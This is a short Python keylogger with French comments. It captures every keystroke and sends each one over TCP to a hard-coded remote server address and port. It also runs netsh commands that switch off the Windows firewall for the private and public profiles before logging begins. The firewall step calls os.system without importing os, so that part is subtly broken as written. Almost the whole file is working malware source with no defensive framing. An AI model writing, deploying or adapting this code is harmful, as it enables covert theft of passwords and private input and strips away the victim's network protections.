import keyboard
import socket

# Adresse et port du serveur local
SERVER_IP = "172.16.8.148"
SERVER_PORT = 65432

def send_keypress(key):
    """Envoie chaque touche pressée au serveur."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((SERVER_IP, SERVER_PORT))
            s.sendall(str(key).encode())  # Envoi de la touche au serveur
    except ConnectionRefusedError:
        pass  # Si le serveur n'est pas en ligne, on ignore l'erreur

def disable_firewall():
    try:
        # Désactiver le pare-feu pour les réseaux Privé et Public
        os.system("netsh advfirewall set privateprofile state off")
        os.system("netsh advfirewall set publicprofile state off")
        print("[INFO] Pare-feu désactivé pour les réseaux Privé et Public.")
    except Exception as e:
        print(f"[ERREUR] Impossible de désactiver le pare-feu : {e}")
disable_firewall()
# Écoute les touches en continu
keyboard.on_press(send_keypress)
keyboard.wait()
